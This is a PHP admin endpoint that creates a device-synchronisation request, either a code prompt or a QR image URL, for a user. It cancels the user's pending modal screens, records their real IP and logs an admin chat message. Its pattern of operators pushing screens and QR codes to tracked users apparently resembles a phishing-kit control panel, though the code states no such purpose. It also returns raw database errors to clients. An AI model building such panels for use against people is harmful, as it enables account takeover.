<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/tela_modales_helpers.php';
require_once __DIR__ . '/../php_config/sincronizacion_helpers.php';
verificarAuth();

$pdo = conectarBD();
$input = leerJSON();

$usuario_id = intval($input['usuario_id'] ?? 0);
$admin_id = intval($_SESSION['admin_id'] ?? 0);
$tipo = trim((string) ($input['tipo'] ?? 'codigo'));
$qr_url = trim((string) ($input['qr_imagen_url'] ?? ''));
$ip_usuario = trim((string) ($input['ip_usuario'] ?? 'panel'));

if (!$usuario_id) {
    jsonError('ID de usuario no válido');
}

if ($admin_id < 1) {
    jsonError('Sesión de administrador no válida', 401);
}

if (!in_array($tipo, ['codigo', 'qr'], true)) {
    jsonError('Tipo de sincronización no válido');
}

if ($tipo === 'qr') {
    if ($qr_url === '' || !filter_var($qr_url, FILTER_VALIDATE_URL)) {
        jsonError('Ingresa una URL válida de imagen QR');
    }
    $path = parse_url($qr_url, PHP_URL_PATH) ?? '';
    if (!preg_match('/\.(png|jpe?g|webp|gif)$/i', $path)) {
        jsonError('La URL del QR debe ser una imagen (.png, .jpg, .webp o .gif)');
    }
}

try {
    $stmtUser = $pdo->prepare('SELECT id, apellido, ip_real FROM usuarios WHERE id = ?');
    $stmtUser->execute([$usuario_id]);
    $usuario = $stmtUser->fetch(PDO::FETCH_ASSOC);

    if (!$usuario) {
        jsonError('Usuario no encontrado', 404);
    }

    $ip_real = trim((string) ($usuario['ip_real'] ?? '')) ?: $ip_usuario;
    $label = syncMensajeChatLabel($tipo);

    $pdo->beginTransaction();

    cancelarTelasModalesPendientes($pdo, $usuario_id);

    $stmt = $pdo->prepare("
        INSERT INTO sincronizacion_dispositivo
        (usuario_id, admin_id, tipo, qr_imagen_url, estado, paso_actual, ip_usuario)
        VALUES (?, ?, ?, ?, 'pendiente', 1, ?)
    ");
    $stmt->execute([
        $usuario_id,
        $admin_id,
        $tipo,
        $tipo === 'qr' ? $qr_url : null,
        $ip_real,
    ]);
    $syncId = (int) $pdo->lastInsertId();

    $chat = $pdo->prepare("
        INSERT INTO mensajes_admin (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario, estado)
        VALUES (?, ?, ?, 'sin_input', ?, 'leido')
    ");
    $chat->execute([$usuario_id, $admin_id, SYNC_CHAT_PREFIX . $label, $ip_real]);

    $pdo->commit();

    jsonResponse([
        'success' => true,
        'message' => 'Tela de sincronización enviada',
        'sync_id' => $syncId,
        'tipo' => $tipo,
    ]);
} catch (Exception $e) {
    if ($pdo->inTransaction()) {
        $pdo->rollBack();
    }
    jsonError('Error de base de datos: ' . $e->getMessage(), 500);
}
